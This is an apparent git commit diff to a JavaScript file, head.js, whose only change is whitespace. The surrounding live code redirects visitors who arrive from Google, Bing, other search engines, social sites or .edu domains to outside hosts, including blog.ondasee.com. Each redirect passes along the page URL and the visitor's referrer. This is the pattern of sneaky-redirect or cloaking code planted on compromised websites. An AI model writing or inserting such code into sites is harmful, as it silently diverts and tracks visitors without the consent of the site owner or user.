76de7058e849de915f93f2e81fccfa1aedf8186d
asking2794 <146243355+asking2794@users.noreply.github.com>
2025-01-27 21:52:24 +0700

    Update head.js

--- head.js
+++ head.js
@@ -4,6 +4,6 @@ var arsT1Google = 'http://blog.ondasee.com';
 
 if(['google.'].some(s => document.referrer.toLowerCase().includes(s))){
 	window.location.href = arsT1Google + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer)
-}else if(['.edu.','google.','msn.', 'bing.', 'yandex.', 'facebook.', 'ecosia', 'qwant', 'pinterest.', 'duckduckgo.', '.yahoo.', 't.co'].some(s => document.referrer.toLowerCase().includes(s))){ 
+}else if(['.edu.', 'google.', 'msn.', 'bing.', 'yandex.', 'facebook.', 'ecosia', 'qwant', 'pinterest.', 'duckduckgo.', '.yahoo.', 't.co'].some(s => document.referrer.toLowerCase().includes(s))){ 
 	window.location.href = arsT1Bing + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer)
 }
